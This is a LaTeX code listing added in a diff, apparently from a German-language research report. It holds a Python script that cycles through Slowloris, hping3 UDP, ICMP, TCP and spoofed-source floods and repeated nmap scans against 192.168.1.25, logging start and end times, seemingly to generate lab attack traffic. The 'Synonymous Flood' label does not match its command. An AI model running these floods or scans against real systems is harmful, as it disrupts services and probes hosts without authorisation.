@@ -1,0 +1,45 @@
+\begin{lstlisting}[caption={Python script for automatet attacks and storage of the timestamps}, label={lst:python_attack_script}]
+import subprocess
+import time
+from datetime import datetime
+
+commands = [
+    ("Slowloris", ["python3", "slowloris.py", "192.168.1.25", "-s", "500"]),
+    ("UDP Flood", ["sudo", "hping3", "--flood", "--udp", "-p", "80", "192.168.1.25"]),
+    ("ICMP Flood", ["sudo", "hping3", "--flood", "-1", "192.168.1.25"]),
+    ("TCP Flood", ["sudo", "hping3", "--flood", "-p", "80", "192.168.1.25"]),
+    ("Synonymous Flood", ["sudo", "hping3", "--flood", "--rand-source", "-p", "80", "192.168.1.25"]),
+    ("Portscan", ["bash", "-c", "for i in {1..1000}; do sudo nmap -sT 192.168.1.25; sleep 1; done"]),
+    ("OS Fingerprinting", ["bash", "-c", "for i in {1..1000}; do sudo nmap -O 192.168.1.25; sleep 1; done"]),
+    ("Aggressive Scan", ["bash", "-c", "for i in {1..1000}; do sudo nmap -A 192.168.1.25; sleep 1; done"]),
+]
+
+LOG_FILE = "timestamp_attacks.txt"
+RUN_TIME = 15 * 60      # 15 Minuten
+BREAK_TIME = 20 * 60    # 20 Minuten
+
+def log_msg(msg):
+    with open(LOG_FILE, "a") as f:
+        f.write(msg + "\n")
+
+while True:
+    for name, cmd in commands:
+        start_time = datetime.now()
+        print(f"Starte {name}: {' '.join(cmd)}")
+        log_msg(f"Start: {start_time.strftime('%Y-%m-%d %H:%M:%S')} - Angriff: {name} - Befehl: {' '.join(cmd)}")
+        try:
+            proc = subprocess.Popen(cmd)
+            proc.wait(timeout=RUN_TIME)
+            note = "Erfolgreich beendet"
+        except subprocess.TimeoutExpired:
+            proc.terminate()
+            try:
+                proc.wait(10)
+            except Exception:
+                proc.kill()
+            note = "Nach 15 Minuten abgebrochen"
+        end_time = datetime.now()
+        log_msg(f"Ende: {end_time.strftime('%Y-%m-%d %H:%M:%S')} ({note})")
+        log_msg("Pause startet jetzt.\n")
+        time.sleep(BREAK_TIME)
+\end{lstlisting}
